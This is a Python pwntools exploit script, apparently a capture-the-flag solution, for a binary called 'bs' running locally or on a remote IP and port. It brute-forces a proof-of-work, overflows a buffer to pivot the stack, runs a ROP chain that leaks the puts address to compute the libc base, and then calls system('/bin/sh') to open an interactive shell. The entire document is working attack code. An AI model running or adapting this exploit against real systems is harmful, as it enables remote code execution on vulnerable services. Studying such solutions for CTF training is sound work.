#!/usr/bin/env python
from pwn import *
from hashlib import sha256
import string
import re
import itertools

def proofofwork(fol,chal):
    for x in itertools.product(string.letters + string.digits, repeat = 4):
        xxxx = ''.join(x)
        s = sha256()
        s.update(xxxx + fol)
        if s.hexdigest() == chal:
            return xxxx
    print 'Not found'
    exit(-1)

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process('./bs', env = {'LD_PRELOAD': './libc.so.6-56d992a0342a67a887b8dcaae381d2cc51205253'})
    else:
        s = remote('47.91.226.78', 10005)
        fol, chal = re.match(r'.*xxxx.(\w*).* == (\w*)',s.recvline(False)).groups()
        s.sendline(proofofwork(fol,chal))

    elf = ELF('./bs')
    libc = ELF('./libc.so.6-56d992a0342a67a887b8dcaae381d2cc51205253')

    pop_rsi_r15 = 0x400c01
    pop_rdi = 0x400c03
    leave_ret = 0x400955

    size = 0x17f0

    s.sendline(str(size))
    payload = ''
    payload += 'A' * 0x1010
    payload += p64(elf.bss(0x4f8))
    payload += p64(pop_rdi) + p64(elf.got['puts'])
    payload += p64(elf.symbols['puts'])
    payload += p64(pop_rdi) + p64(0)
    payload += p64(pop_rsi_r15) + p64(elf.bss(0x500)) + p64(0)
    payload += p64(elf.symbols['read'])
    payload += p64(leave_ret)
    payload = payload.ljust(size,'A')
    s.send(payload)

    s.recvuntil('goodbye.\n')
    libc_base = u64(s.recvline(False).ljust(8,'\0')) - 0x6f690

    log.info('libc base: %#x' % libc_base)

    payload = ''
    payload += p64(pop_rdi) + p64(elf.bss(0x518))
    payload += p64(libc_base + libc.symbols['system'])
    payload += '/bin/sh\0'
    s.send(payload)

    s.interactive()
